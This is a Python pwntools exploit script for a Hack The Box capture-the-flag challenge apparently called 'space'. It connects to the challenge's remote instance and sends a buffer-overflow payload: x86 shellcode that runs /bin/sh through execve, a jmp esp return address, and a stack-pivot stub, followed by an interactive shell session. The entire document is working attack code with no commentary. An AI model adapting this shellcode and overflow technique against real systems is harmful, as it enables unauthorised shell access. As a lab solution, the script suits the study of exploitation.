#jmp_esp = 0x0804919f:
from pwn import *

context.terminal = ['urxvt','-e','sh','-c']
context.log_level = 'DEBUG'
#for local
#sh = gdb.debug("./space")
#for remote
sh = remote("docker.hackthebox.eu",31465)
jmp_esp = p32(0x0804919f)

padding = b'a'*18
payload = b'a' + b'\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + jmp_esp + b'\x31\xd2\x31\xc0\x83\xec\x15\xff\xe4'
sh.sendlineafter("> ",payload)

sh.interactive()
